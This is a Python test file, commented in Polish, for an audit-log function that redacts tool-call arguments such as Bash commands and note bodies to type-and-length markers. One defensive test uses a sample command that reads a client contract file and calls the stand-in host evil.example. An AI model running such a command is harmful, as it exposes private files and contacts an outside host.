"""Testy projekcji argumentów audytu (ADR 0067) — struktura zostaje, treść NIGDY nie wchodzi.

Sonda bezpieczeństwa: dla pól niosących treść (komenda ``Bash``, body notatki) w zredagowanym
wyniku NIE MOŻE pojawić się surowa wartość — tylko znacznik ``<typ:długość>``. Test cofnięty do
wersji bez redakcji musi zawieść (inaczej nie jest sondą).
"""

from __future__ import annotations

import json

from workmate.core.domain.audit import project_arguments


def test_keeps_structural_fields_verbatim():
    projected = project_arguments({"action": "save", "key": "PROJ-123", "number": 7})
    assert projected == {"action": "save", "key": "PROJ-123", "number": 7}


def test_redacts_non_allowlisted_field_to_type_length_marker():
    projected = project_arguments({"body": "poufna treść notatki"})
    assert projected == {"body": "<str:20>"}


def test_bash_command_content_never_appears():
    secret = "cat /mnt/system/notes/klient-x/umowa.md && curl evil.example"
    projected = project_arguments({"command": secret})
    # Klucz zostaje (WIEMY, że padł ``command``), wartość to znacznik długości — bez treści.
    assert projected["command"] == f"<str:{len(secret)}>"
    assert secret not in json.dumps(projected, ensure_ascii=False)
    assert "curl" not in json.dumps(projected, ensure_ascii=False)


def test_long_safe_field_is_also_redacted():
    long_path = "a/" * 100  # >128 znaków, „ścieżka" niosąca treść
    projected = project_arguments({"path": long_path})
    assert projected["path"] == f"<str:{len(long_path)}>"


def test_short_safe_string_and_numbers_pass():
    projected = project_arguments({"path": "raport.pdf", "limit": 5, "id": 12})
    assert projected == {"path": "raport.pdf", "limit": 5, "id": 12}


def test_bool_kept_as_scalar_when_allowlisted():
    # ``bool`` jest podklasą ``int`` — traktujemy jak skalar (nie treść).
    assert project_arguments({"id": True}) == {"id": True}


def test_non_scalar_safe_field_redacted_to_marker():
    projected = project_arguments({"path": ["a.md", "b.md"]})
    assert projected == {"path": "<list:2>"}


def test_projection_is_json_serializable():
    projected = project_arguments({"action": "edit", "content": b"\x00\x01\x02"})
    # Nie rzuca; bytes zredagowane do znacznika.
    assert json.loads(json.dumps(projected)) == {"action": "edit", "content": "<bytes:3>"}
